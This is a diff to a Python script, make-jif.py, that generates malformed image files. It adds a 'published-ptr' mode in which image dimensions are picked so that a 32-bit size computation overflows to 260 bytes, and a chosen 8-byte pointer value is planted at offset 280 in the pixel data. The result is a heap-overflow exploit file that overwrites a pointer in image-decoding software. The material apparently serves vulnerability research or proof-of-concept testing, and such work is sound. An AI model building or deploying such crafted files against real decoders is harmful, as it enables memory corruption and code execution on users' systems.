@@ -10,7 +10,8 @@ product 45771*46918 = 0x80000082, whose alpha-doubled data_size is 260.
 
 Usage: make-jif.py OUT (bytes HEXBYTE | ptr | published HEXBYTE |
                         published-long HEXBYTE | published-mix IN OUT |
-                        safe HEXBYTE)
+                        published-ptr | safe HEXBYTE)
+
 """
 import struct
 import sys
@@ -23,6 +24,10 @@ if kind == "safe":
     plain = bytes([int(sys.argv[3], 16)]) * 16
 elif kind == "bytes":
     plain = bytes([int(sys.argv[3], 16)]) * 40
+elif kind == "published-ptr":
+    LEN, HEIGHT = 45771, 46918
+    chosen = struct.pack("<Q", 0x00007F0000414243)
+    plain = b"\x4d" * 280 + chosen + b"\x4d" * (448 - 288)
 elif kind in ("published", "published-long", "published-mix"):
     LEN, HEIGHT = 45771, 46918
     nbytes = 448
@@ -43,7 +48,7 @@ else:
 if kind in ("bytes", "ptr"):
     assert LEN * HEIGHT == 0x80000002
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4
-elif kind in ("published", "published-long", "published-mix"):
+elif kind in ("published", "published-long", "published-mix", "published-ptr"):
     assert LEN * HEIGHT == 0x80000082
     assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 260
 gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
